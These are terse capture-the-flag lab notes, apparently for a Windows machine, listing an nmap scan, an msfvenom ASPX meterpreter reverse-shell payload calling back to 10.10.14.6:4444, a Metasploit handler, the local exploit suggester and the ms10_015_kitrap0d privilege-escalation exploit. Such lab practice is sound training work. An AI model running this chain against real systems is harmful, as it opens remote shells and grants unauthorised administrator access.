# Service Enumeration
```python
nmap -sC -sV -Pn -n -p- --min-rate=400 --min-parallelism=512 10.10.14.6

```

# Recon
```python
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f aspx > shell.aspx

msf use exploit/multi/handler
msf exploit(multi/handler) set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) set lhost 10.10.14.6
msf exploit(multi/handler) set lport 4444
msf exploit(multi/handler) exploit

use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > set session 1
msf post(multi/recon/local_exploit_suggester) > exploit

use exploit/windows/local/ms10_015_kitrap0d
msf exploit(ms10_015_kitrap0d) >set lhost 10.10.14.6
msf exploit(ms10_015_kitrap0d) >set lport 4321
msf exploit(ms10_015_kitrap0d) >set session 2
msf exploit(ms10_015_kitrap0d) >exploit

getuid
```

# Privilege Escalation
```python
looking for root.txt

```